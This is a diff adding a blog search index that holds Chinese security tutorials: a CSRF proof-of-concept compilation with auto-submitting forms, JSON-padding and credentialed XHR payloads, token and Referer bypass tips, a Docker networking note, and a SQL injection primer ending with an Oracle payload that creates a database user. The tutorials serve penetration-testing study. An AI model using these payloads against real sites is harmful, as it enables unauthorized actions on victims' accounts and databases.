@@ -1,0 +1,1047 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>CSRF漏洞整理汇总</title>
+    <url>/2022/07/28/CSRF%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h1 id="CSRF漏洞整理汇总"><a href="#CSRF漏洞整理汇总" class="headerlink" title="CSRF漏洞整理汇总"></a>CSRF漏洞整理汇总</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</p>
+<p><strong>漏洞成因</strong></p>
+<p>错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。</p>
+<h2 id="CSRF漏洞的要点"><a href="#CSRF漏洞的要点" class="headerlink" title="CSRF漏洞的要点"></a>CSRF漏洞的要点</h2><ol>
+<li>目标请求为敏感的增删改操作</li>
+<li>未校验Referer&#x2F;Origin等头</li>
+<li>所有的请求参数可预知</li>
+<li>Web应用身份验证机制是基于Cookie形式的</li>
+</ol>
+<h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><ol>
+<li>自定义请求头加Token</li>
+<li>校验来源（Origin或Referer）</li>
+<li>使用验证码</li>
+</ol>
+<h2 id="POC类型整理"><a href="#POC类型整理" class="headerlink" title="POC类型整理"></a>POC类型整理</h2><p>针对不同类型的数据提交的方式，在构造CSRF poc时会有对应的不同。下面将对不同的数据提交的方式，整理对应的poc</p>
+<h3 id="1-GET型CSRF"><a href="#1-GET型CSRF" class="headerlink" title="1.GET型CSRF"></a>1.GET型CSRF</h3><p>对于GET型的CSRF漏洞，我们可以使用任意的支持src属性的标签构造poc，如<code>&lt;img&gt;</code>等。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">https://www.a.com/delete?id</span>=<span class="string">123</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-普通的表单提交"><a href="#2-普通的表单提交" class="headerlink" title="2. 普通的表单提交"></a>2. 普通的表单提交</h3><h4 id="2-1-application-x2F-x-www-form-urlencoded"><a href="#2-1-application-x2F-x-www-form-urlencoded" class="headerlink" title="2.1 application&#x2F;x-www-form-urlencoded"></a>2.1 application&#x2F;x-www-form-urlencoded</h4><p>这应该是最常见的 POST 提交数据的方式了。浏览器的原生<code>&lt;form&gt;</code>表单，如果不设置 <code>enctype</code> 属性，那么最终就会以 application&#x2F;x-www-form-urlencoded 方式提交数据。请求类似于下面这样（无关的请求头在本文中都省略掉了）</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://www.example.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">  Content-Type: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">title</span>=test&amp;sub%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">1</span>&amp;sub%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">2</span>&amp;sub%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">3</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>首先，Content-Type 被指定为 application&#x2F;x-www-form-urlencoded；</p>
+<p>其次，提交的数据按照 key1&#x3D;val1&amp;key2&#x3D;val2 的方式进行编码，key 和 val 都进行了 URL 转码</p>
+</blockquote>
+<p>很多时候，我们用 Ajax 提交数据时，也是使用这种方式。例如 <a href="http://jquery.com/">JQuery</a> 和 <a href="http://www.qwrap.com/">QWrap</a> 的 Ajax，Content-Type 默认值都是「application&#x2F;x-www-form-urlencoded;charset&#x3D;utf-8」。</p>
+<p>那么，对应的poc为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated  --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://example/api&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3454&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">autoSubmit</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">autoSubmit</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-2-multipart-x2F-form-data"><a href="#2-2-multipart-x2F-form-data" class="headerlink" title="2.2 multipart&#x2F;form-data"></a>2.2 multipart&#x2F;form-data</h4><p>这又是一个常见的 POST 数据提交的方式。我们使用表单上传文件时，必须让 <code>&lt;form&gt; </code>表单的 <code>enctype</code> 等于 multipart&#x2F;form-data。直接来看一个请求示例：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://www.example.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Disposition: form-data; name=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br><span class="line"><span class="language-jboss-cli">title</span></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;chrome.png&quot;</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Type: image/png</span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br><span class="line"><span class="language-jboss-cli">PNG <span class="string">...</span> content of chrome.png <span class="string">...</span></span></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。</p>
+<p>然后 Content-Type 里指明了数据是以 multipart&#x2F;form-data 来编码，本次请求的 boundary 是什么内容。</p>
+<p>消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 <code>--boundary</code> 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 <code>--boundary--</code> 标示结束。</p>
+</blockquote>
+<p><strong>Part</strong> 头信息中必须包含一个 <code>Content-Disposition</code> 头，其他的头信息则为可选项， 比如 <code>Content-Type</code> 等。</p>
+<p><strong><code>Content-Disposition</code></strong> 包含了 type 和 一个名字为 name 的 parameter，type 是 form-data，name 参数的值则为表单控件（也即 field）的名字，如果是文件，那么还有一个 filename 参数，值就是文件名。</p>
+<p>对于可选的 Content-Type（如果没有的话），默认就是 <code>text/plain</code>。</p>
+<p>对应的csrf poc为</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://a.com/getAddress&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">autoSubmit</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">autoSubmit</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-JSON数据"><a href="#3-JSON数据" class="headerlink" title="3. JSON数据"></a>3. JSON数据</h3><p>对于提交数据是JSON数据的，有以下几种利用方式。具体测试时可以都试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="3-1-用form来提交，把name置为一段JSON"><a href="#3-1-用form来提交，把name置为一段JSON" class="headerlink" title="3.1 用form来提交，把name置为一段JSON"></a>3.1 用form来提交，把name置为一段JSON</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.xxx.com/webnet/edit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;<span class="symbol">&amp;#123;</span><span class="symbol">&amp;quot;</span>pSpotId<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>120201<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>pSignTimes<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>70<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>pModuleID<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>207<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>pSceneid<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>120201007000046<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#125;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这样POST的数据包会多一个“&#x3D;”，因为我们虽然把value置为空，然后还是会出现“name&#x3D;”。</p>
+<p>这种情况下服务端的JSON解析器可能会拒绝这段JSON，因为它不符合JSON的数据格式。参照外国基佬的做法，我们可以给value赋值从而对这个“&#x3D;”后面的数据进行补全，使得其构成一个完整的JSON格式，可避免解析器报错（JSON Padding）。</p>
+<p><strong>补全等号</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.xxx.com/webnet/edit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;, &quot;test&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;test&quot;&#125;&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 需要注意的是，在原始的数据包里Content-Type的值是application&#x2F;json，而以form去提交是没法设置enctype为application&#x2F;json的。如果服务端验证了Content-Type。则也可能失败</p>
+<h4 id="2-3-XHR进行提交"><a href="#2-3-XHR进行提交" class="headerlink" title="2.3 XHR进行提交"></a>2.3 XHR进行提交</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC Exploit<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract SID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submitRequest()&quot;</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">submitRequest</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;https://a.com/review&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json, text/plain, */*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;country&quot;</span>: <span class="string">&quot;VEN&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;identity_type&quot;</span>: <span class="string">&quot;passport&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;first_name&quot;</span>: <span class="string">&quot;dfa&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;last_name&quot;</span>: <span class="string">&quot;dfaf&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&quot;identity_no&quot;</span>: <span class="string">&quot;121212&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                &#125;));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种利用方式，需要满足XHR的要求</p>
+<h2 id="CSRF绕过"><a href="#CSRF绕过" class="headerlink" title="CSRF绕过"></a>CSRF绕过</h2><h3 id="1-绕过csrf-token"><a href="#1-绕过csrf-token" class="headerlink" title="1. 绕过csrf token"></a>1. 绕过csrf token</h3><p>如果一个敏感操作的参数里面，有一个csrf token，我们可以做如下尝试绕过</p>
+<ol>
+<li>将该参数置空</li>
+<li>设置为一个固定值</li>
+<li>删除该参数</li>
+</ol>
+<h3 id="2-如何把Referer头置空"><a href="#2-如何把Referer头置空" class="headerlink" title="2. 如何把Referer头置空"></a>2. 如何把Referer头置空</h3><ol>
+<li>从https页面发送http请求时，referer头为空</li>
+<li>通过iframe标签加载的请求时，没有Referer头</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=http://www.a.com/delete.php?id=1&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>点设置content为no-referer时(17年新出的功能，本意防止用户隐私泄露)，没有referer头。</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>csrf web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker for Mac与宿主机通信</title>
+    <url>/2019/06/06/Docker-for-Mac%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1/</url>
+    <content><![CDATA[<p>因为Docker for Mac的实现与Docker for Linux的实现有些不一样，所以在Mac上，当容器需要与宿主机进行通信的时候，发现直接访问宿主机的IP（ 172.17.0.1）是访问不通的。Mac的宿主机上，也没有docker0这个虚拟网卡。<br>当尝试访问宿主机的一个端口时，会提示Connection refused.</p>
+<p>在container中应当使用一个特殊的DNS来访问宿主机<code>docker.for.mac.host.internal</code></p>
+<p>参考链接：(<a href="https://imhanjm.com/2018/12/16/macos%20docker%20container%E8%BF%9E%E6%8E%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA172.17.0.1%E7%9A%84%E5%8A%9E%E6%B3%95/">Macos Docker container连接宿主机172.17.0.1的办法
+</a></p>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞总结1</title>
+    <url>/2019/10/12/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="SQL注入漏洞总结"><a href="#SQL注入漏洞总结" class="headerlink" title="SQL注入漏洞总结"></a>SQL注入漏洞总结</h1><h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h2><h3 id="一、SQL语句基础知识"><a href="#一、SQL语句基础知识" class="headerlink" title="一、SQL语句基础知识"></a>一、SQL语句基础知识</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ] </span><br><span class="line">      [HIGH_PRIORITY] </span><br><span class="line">      [STRAIGHT_JOIN] </span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] </span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] </span><br><span class="line">    select_expr [, select_expr ...] </span><br><span class="line">    [FROM table_references </span><br><span class="line">    [WHERE where_condition] </span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125; </span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]] </span><br><span class="line">    [HAVING where_condition] </span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125; </span><br><span class="line">      [ASC | DESC], ...] </span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] </span><br><span class="line">    [PROCEDURE procedure_name(argument_list)] </span><br><span class="line">    [INTO OUTFILE &#x27;file_name&#x27; export_options </span><br><span class="line">      | INTO DUMPFILE &#x27;file_name&#x27; </span><br><span class="line">      | INTO var_name [, var_name]] </span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-SQL优先级"><a href="#2-SQL优先级" class="headerlink" title="2. SQL优先级"></a>2. SQL优先级</h4><blockquote>
+<p>AND 的优先级比 OR 的优先级要高。先计算AND的结果，再计算or的结果<br>同优先级AND中如果有恒为0(如and 1&#x3D;2),则直接返回0，不执行同级中后面的语句<br>多个OR连接的语句中如果有恒为1(如or 1&#x3D;1),则直接返回1，不执行同级中后面的语句</p>
+</blockquote>
+<h4 id="3-SQL-转义字符"><a href="#3-SQL-转义字符" class="headerlink" title="3.  SQL 转义字符"></a>3.  SQL 转义字符</h4><h5 id="3-1-通用特殊字符"><a href="#3-1-通用特殊字符" class="headerlink" title="3.1 通用特殊字符"></a>3.1 通用特殊字符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;（单引号）：代码与数据间的分界线。</span><br><span class="line">可以使用单引号把数字值引起来，大多数数据库将把该值转换为他所代表的数值。Microsoft SQL Server 例外。</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-2-注释字符"><a href="#3-2-注释字符" class="headerlink" title="3.2 注释字符"></a>3.2 注释字符</h5><table>
+<thead>
+<tr>
+<th><code>--</code></th>
+<th>用于单行注释</th>
+<th>SQL server<br />Oracle<br />PostgreSQl</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;*    *&#x2F;</td>
+<td>用于多行注释</td>
+<td>SQL server<br />Oracle<br />PostgreSQl</td>
+</tr>
+<tr>
+<td>–</td>
+<td>用于单行注释。<br />要求第二个连字符后面跟一个空格或控制字符（如制表符、换行符）</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>#</td>
+<td>用于单行注释</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>&#x2F;*    *&#x2F;</td>
+<td>用于多行注释</td>
+<td>MySQL</td>
+</tr>
+</tbody></table>
+<h5 id="3-3-拼接字符"><a href="#3-3-拼接字符" class="headerlink" title="3.3 拼接字符"></a>3.3 拼接字符</h5><table>
+<thead>
+<tr>
+<th>Oracle &amp; PostgreSQL</th>
+<th>‘bi’&amp;#x7c;&amp;#x7c;’kes’</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Microsoft SQL Server</td>
+<td><code>&#39;bi&#39;+&#39;kes&#39;</code></td>
+<td>+为 URL 保留字符，记得转义%2B</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>&#39;bi&#39;&#39;kes&#39;</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="4-堆叠查询"><a href="#4-堆叠查询" class="headerlink" title="4. 堆叠查询"></a>4. 堆叠查询</h4><p>堆叠查询即在单个数据库连接中执行多个查询序列。对于使用MSSQL 数据库的应用，格外有效。但不是对所有的平台都支持堆叠查询。</p>
+<p>可以用<code>;</code>执行多条语句。服务器将依次执行每条语句，数据库服务器向客户端返回每条语句发送的结果集。<br>如：<code>http://www.a.com/a.aspx?user=54;select *****;--</code></p>
+<p><strong>支持堆叠查询的语言&#x2F;数据库</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>MSSQL</th>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+<th>Oracle</th>
+<th>Access</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ASP</td>
+<td><strong>支持</strong></td>
+<td></td>
+<td></td>
+<td></td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>ASP.NET</td>
+<td><strong>支持</strong></td>
+<td></td>
+<td></td>
+<td></td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td><strong>支持</strong></td>
+<td>不支持</td>
+<td><strong>支持</strong></td>
+<td></td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>不支持</td>
+<td></td>
+<td></td>
+<td>PL&#x2F;SQL</td>
+<td>不支持</td>
+</tr>
+</tbody></table>
+<h5 id="4-1-Oracle-执行堆叠查询的方法"><a href="#4-1-Oracle-执行堆叠查询的方法" class="headerlink" title="4.1 Oracle 执行堆叠查询的方法"></a>4.1 Oracle 执行堆叠查询的方法</h5><p>Oracle 数据库是不允许执行堆叠查询的，但可以使用 <code>PL/SQL</code> 来执行堆叠查询.</p>
+<p>默认情况下，在安装 Oracle 时安装了一些默认的包，其中两个允许执行<code>PL/SQL</code>匿名块的函数是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbms_xmlquery.newcontext()</span><br><span class="line">dbms_xmlquery.getxml()</span><br><span class="line">-- 任何数据库用户都可以执行这两个函数。在利用 SQL 注入漏洞的时候，可以使用这两个函数来执行 DML/DDL 语句块。如：</span><br><span class="line"></span><br><span class="line">http://www.a.com/a.jsp?id=1 and (select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#x27;&#x27; create user pwned identified by pwn3d &#x27;&#x27;; commit;end;)from dual) is not null --</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-强制类型转换"><a href="#5-强制类型转换" class="headerlink" title="5. 强制类型转换"></a>5. 强制类型转换</h4><table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL</td>
+<td>SELECT CAST(‘123’ AS varchar)</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>SELECT CAST(‘123’ AS char)</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>SELECT CAST(123 AS varchar) FROM dual</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT CAST(123 AS text)<br />可以使用&amp;#x7c;&amp;#x7c;链接字符串链接，只要有一个变量的值为字符串即可</td>
+</tr>
+</tbody></table>
